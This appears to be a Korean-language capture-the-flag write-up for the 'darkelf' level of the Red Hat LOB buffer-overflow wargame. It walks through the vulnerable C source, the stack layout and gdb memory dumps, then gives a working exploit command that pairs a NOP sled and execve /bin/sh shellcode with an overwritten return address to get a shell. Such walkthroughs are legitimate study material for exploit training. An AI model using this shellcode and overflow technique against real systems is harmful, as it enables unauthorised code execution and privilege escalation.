============================================================================================================
[redhat-lob] (6) darkelf
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="argv[1] value"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="RET"];
        e [shape=box, label="argv[1] address"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    main(int argc, char *argv[])
    {
        char buffer[40];
        int i;

        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
            memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
            printf("stack is still your friend.\n");
            exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
            printf("argument is too long!\n");
            exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
    }


|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte)
    SFP     (4byte)
    RET     (4byte)  <- strcpy overflow
    argc    (4byte)  <- 0x00000002
    argv[0] (4byte)  <- argv[0] 주소
    argv[1] (4byte)  <- argv[1] 주소
    ----------------
    HIGH    
    ================


|

Buffer Overflow
============================================================================================================


Overflow condition 

- environ을 초기화하여 환경 변수 사용를 통한 쉘코드 삽입이 불가능하다.
- argv[1]의 47번째 문자열이 "\\xbf"이어야 함
- argv[1]의 길이가 47이하 이어야 함


.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./darkelf `python -c 'print "a"*47'`

    stack is still your friend.

    $ ./darkelf `python -c 'print "a"*47+"\xbf"'`

    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒
    Segmentation fault


|

exploit
============================================================================================================

argv[1]이 저장되는 주소 확인
------------------------------------------------------------------------------------------------------------

앞의 조건에 argv[1][47]값이 "\\xbf"인지 확인하기 때문에, gdb를 이용하여 argv[1]이 저장되는 주소(buffer)를 찾는다.

.. code-block:: console

    (gdb) b *main
    Breakpoint 1 at 0x8048500

    (gdb) r `python -c 'print "a"*47+"\xbf"'`
    Starting program: /home/wolfman/darkelf2 `python -c 'print "a"*47+"\xbf"'`
    /bin/bash: /home/goblin/.bashrc: Permission denied

    Breakpoint 1, 0x8048500 in main ()

    (gdb) stepi
    0x8048501 in main ()

    (gdb) i reg $esp
    esp            0xbffffad8       -1073743144

    (gdb) i reg $ebp
    ebp            0xbffffaf8       -1073743112

    (gdb) x/100x $esp

    ==========================================================================
    0xbffffad8:     0xbffffaf8      0x400309cb      0x00000002      0xbffffb24
    0xbffffae8:     0xbffffb30      0x40013868      0x00000002      0x08048450
    0xbffffaf8:     0x00000000      0x08048471      0x08048500      0x00000002
    0xbffffb08:     0xbffffb24      0x08048390      0x0804864c      0x4000ae60
    0xbffffb18:     0xbffffb1c      0x40013e90      0x00000002      0xbffffc1a
    0xbffffb28:     0xbffffc31      0x00000000      0xbffffc62      0xbffffc84
    0xbffffb38:     0xbffffc8e      0xbffffc9c      0xbffffcbb      0xbffffccb
    0xbffffb48:     0xbffffce4      0xbffffd00      0xbffffd1f      0xbffffd2a
    0xbffffb58:     0xbffffd38      0xbffffd7a      0xbffffd8d      0xbffffda2
    0xbffffb68:     0xbffffdb2      0xbffffdbf      0xbffffddd      0xbffffde8
    0xbffffb78:     0xbffffdf9      0xbffffe0b      0xbffffe1a      0xbffffe22
    0xbffffb88:     0x00000000      0x00000003      0x08048034      0x00000004
    0xbffffb98:     0x00000020      0x00000005      0x00000006      0x00000006
    0xbffffba8:     0x00001000      0x00000007      0x40000000      0x00000008
    0xbffffbb8:     0x00000000      0x00000009      0x08048450      0x0000000b
    0xbffffbc8:     0x000001f9      0x0000000c      0x000001f9      0x0000000d
    0xbffffbd8:     0x000001f9      0x0000000e      0x000001f9      0x00000010
    0xbffffbe8:     0x0fabfbff      0x0000000f      0xbffffc15      0x00000000
    0xbffffbf8:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbffffc08:     0x00000000      0x00000000      0x00000000      0x38366900
    0xbffffc18:     0x682f0036      0x2f656d6f      0x666c6f77      0x2f6e616d
    0xbffffc28:     0x6b726164      0x32666c65      0x61616100      0x61616161
                                                          ^               ^
    0xbffffc38:     0x61616161      0x61616161      0x61616161      0x61616161
                          ^               ^               ^ argv[1] = 0xbffffc41
    0xbffffc48:     0x61616161      0x61616161      0x61616161      0x61616161
    0xbffffc58:     0x61616161      0x61616161      0x454c00bf      0x504f5353
    ==========================================================================

|

RET 주소를 argv[1] 주소로 변경하여 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ================
    LOW     
    ----------------
    Buffer  (40byte) <- dummy*19 + shellcode(21)
    SFP     (4byte)  <- shellcode(4)
    RET     (4byte)  <- argv[1] address
    argv[1] (4byte)  
    ----------------
    HIGH    
    ================

|

오버플로우시 RET 주소를 argv[1] 주소로 변경하여 해당 쉘코드가 실행되도록 한다. buffer의 최초 주소값을 확인하여 4바이트씩 증가하면서 주소를 변경하면서 공격을 진행하면 성공시킬 수 있다.

nop (19 byte) + shellcode (25 byte) + argv[1] address

.. code-block:: console

    $ ./darkelf `python -c 'print "\x90"*19 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x41\xfc\xff\xbf"'`
    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒PS▒▒°
                                           ̀A▒▒▒

    bash$ whoami
    darkelf
    bash$ my-pass
    euid = 506
    kernel crashed

